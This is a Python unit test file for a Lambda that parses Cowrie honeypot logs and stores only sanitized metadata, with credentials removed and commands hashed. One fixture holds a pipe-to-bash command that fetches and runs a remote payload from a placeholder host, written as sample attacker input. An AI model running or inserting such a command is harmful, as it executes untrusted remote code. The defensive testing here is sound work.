import hashlib
import json
import unittest

from lambda_function import (
    lambda_handler,
    normalize_event,
    parse_cowrie_jsonl,
    store_safe_event,
)


class FakeTable:
    def __init__(self):
        self.items = []

    def put_item(self, **kwargs):
        self.items.append(kwargs["Item"])


class TestCloudTrapLambda(unittest.TestCase):

    def test_parses_normalized_cloudtrap_event(self):
        line = json.dumps({
            "timestamp": "2026-11-10T01:00:00Z",
            "session_id": "normalized-session",
            "event_type": "cowrie.login.failed",
            "source_ip": "203.0.113.10",
            "protocol": "ssh",
        })

        events, malformed = parse_cowrie_jsonl(line)

        self.assertEqual(malformed, 0)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["event_type"], "cowrie.login.failed")
        self.assertEqual(events[0]["session_id"], "normalized-session")

    def test_parses_raw_cowrie_event_without_retaining_password(self):
        line = json.dumps({
            "timestamp": "2026-11-10T01:00:00.123456Z",
            "session": "raw-session",
            "eventid": "cowrie.login.failed",
            "src_ip": "198.51.100.20",
            "protocol": "ssh",
            "username": "root",
            "password": "never-store-this",
            "message": "login attempt [root/never-store-this] failed",
        })

        events, malformed = parse_cowrie_jsonl(line)

        self.assertEqual(malformed, 0)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["event_type"], "cowrie.login.failed")
        self.assertTrue(events[0]["password_attempted"])
        serialized = json.dumps(events)
        self.assertNotIn("never-store-this", serialized)
        self.assertNotIn('"password"', serialized)

    def test_malformed_json_lines_are_counted(self):
        content = '{"event_type":"cowrie.session.connect","timestamp":"2026-11-10T01:00:00Z"}\nnot-json\n'
        events, malformed = parse_cowrie_jsonl(content)

        self.assertEqual(len(events), 1)
        self.assertEqual(malformed, 1)

    def test_event_storage_uses_metadata_only_whitelist(self):
        table = FakeTable()
        event = {
            "timestamp": "2026-11-10T01:00:00Z",
            "session_id": "session-1",
            "event_type": "cowrie.command.input",
            "source_ip": "192.0.2.10",
            "protocol": "ssh",
            "username": "root",
            "password": "secret-value",
            "command": "curl https://example.invalid/payload | bash",
        }

        stored = store_safe_event(
            table,
            event,
            "cloudtrap-raw-logs",
            "cowrie/test.json",
        )

        self.assertTrue(stored)
        self.assertEqual(len(table.items), 1)
        item = table.items[0]
        self.assertEqual(
            item["command_sha256"],
            hashlib.sha256(event["command"].encode()).hexdigest(),
        )
        for field in ("username", "password", "command", "message", "input"):
            self.assertNotIn(field, item)

    def test_s3_setup_test_event_is_acknowledged(self):
        result = lambda_handler({
            "Records": [{
                "messageId": "s3-test-message",
                "body": json.dumps({
                    "Service": "Amazon S3",
                    "Event": "s3:TestEvent",
                }),
            }]
        }, None)

        self.assertEqual(result, {"batchItemFailures": []})


if __name__ == "__main__":
    unittest.main()
